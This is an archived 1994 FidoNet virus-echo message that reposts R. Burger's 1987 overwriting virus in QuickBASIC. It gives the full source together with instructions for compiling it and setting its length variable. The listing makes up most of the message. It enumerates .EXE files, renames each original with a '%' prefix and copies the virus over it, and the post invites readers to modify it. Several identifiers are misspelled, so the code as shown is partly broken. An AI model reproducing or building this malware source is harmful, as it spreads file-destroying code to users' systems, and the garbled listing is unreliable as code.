;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 4 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11
;To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : BURG_VIR.BAS
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Viral Doctor, 2:283/718 (06 Nov 94 16:19)
;* To   : Mark Hapershaw
;* Subj : BURG_VIR.BAS
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Viral.Doctor@f718.n283.z2.fidonet.org
;                           Viruses in Basic
;                           ----------------
;
;
;Basic is great language and often people think of it as a limited language
;and will not be of any use in creating something like a virus. Well you are
;really wrong. Lets take a look at a Basic Virus created by R. Burger in 1987.
;This program is an overwritting virus and uses (Shell) MS-DOS to infect .EXE
;files.To do this you must compile the source code using a the Microsoft
;Quick-BASIC.Note the lenght of the compiled and the linked .EXE file and edit
;the source code to place the lenght of the object program in the LENGHTVIR
;variable. BV3.EXE should be in the current directory, COMMAND.COM must be
;available, the LENGHTVIR variable must be set to the lenght of the linked
;
;program and remember to use /e parameter when compiling.



10 REM ** DEMO
20 REM ** MODIFY IT YOUR OWN WAY IF DESIRED **
30 REM ** BASIC DOESNT SUCK
40 REM ** NO KIDDING
50 ON ERROR GOTO 670
60 REM *** LENGHTVIR MUST BE SET **
70 REM *** TO THE LENGHT TO THE **
80 REM *** LINKED PROGRAM ***
90 LENGHTVIR=2641
100 VIRROOT$="BV3.EXE"
110 REM *** WRITE THE DIRECTORY IN THE FILE "INH"
130 SHELL "DIR *.EXE>INH"
140 REM ** OPEN "INH" FILE AND READ NAMES **
150 OPEN "R",1,"INH",32000
160 GET #1,1
170 LINE INPUT#1,ORIGINAL$
180 LINE INPUT#1,ORIGINAL$
190 LINE INPUT#1,ORIGINAL$
200 LINE INPUT#1,ORIGINAL$
210 ON ERROR GOT 670
220 CLOSE#2
230 F=1:LINE INPUT#1,ORIGINAL$
240 REM ** "%" IS THE MARKER OF THE BV3
250 REM ** "%" IN THE NAME MEANS
260 REM  ** INFECTED COPY PRESENT
270 IF MID$(ORIGINAL$,1,1)="%" THEN GOTO 210
280 ORIGINAL$=MID$(ORIGINAL$,1,13)
290 EXTENSIONS$=MID$(ORIGINAL,9,13)
300 MID$(EXTENSIONS$,1,1)="."
310 REM *** CONCATENATE NAMES INTO FILENAMES **
320 F=F+1
330 IF MID$(ORIGINAL$,F,1)=" " OR MID$ (ORIGINAL$,F,1)="." OR F=13 THEN
GOTO 350
340 GOTO 320
350 ORIGINAL$=MID$(ORIGINAL$,1,F-1)+EXTENSION$
360 ON ERROR GOTO 210
365 TEST$=""
370 REM ++ OPEN FILE FOUND +++
380 OPEN "R",2,OROGINAL$,LENGHTVIR
390 IF LOF(2) < LENGHTVIR THEN GOTO 420
400 GET #2,2
410 LINE INPUT#1,TEST$
420 CLOSE#2
431 REM ++ CHECK IF PROGRAM IS ILL ++
440 REM ++ "%" AT THE END OF THE FILE MEANS..
450 REM ++ FILE IS ALREADY SICK ++
460 REM IF MID$(TEST,2,1)="%" THEN GOTO 210
470 CLOSE#1
480 ORIGINALS$=ORIGINAL$
490 MID$(ORIGINALS$,1,1)="%"
499 REM ++++ SANE "HEALTHY" PROGRAM ++++
510 C$="COPY "+ORIGINAL$+" "+ORIGINALS$
520 SHELL C$
530 REM *** COPY VIRUS TO HEALTHY PROGRAM ****
540 C$="COPY "+VIRROOT$+ORIGINAL$
550 SHELL C$
560 REM *** APPEND VIRUS MARKER ***
570 OPEN ORIGINAL$ FOR APPEND AS #1 LEN=13
580 WRITE#1,ORIGINALS$
590 CLOSE#1
630 REM ++ OUYPUT MESSAGE ++
640 PRINT "INFECTION IN " ;ORIGIANAL$; "  !! BE WARE !!"
650 SYSTEM
660 REM ** VIRUS ERROR MESSAGE
670 PRINT "VIRUS INTERNAL ERROR GOTTCHA !!!!":SYSTEM
680 END


;This basic virus will only attack .EXE files. After the execution you will
;see a "INH" file which contains the directory, and the file %SORT.EXE.
;Programs which start with "%" are NOT infected ,they pose as back up copies.
;
;-+-  DinoMail v.1.0 Alpha
; + Origin: Virus Research Centre Holland (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/Txx          Specify output file type
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

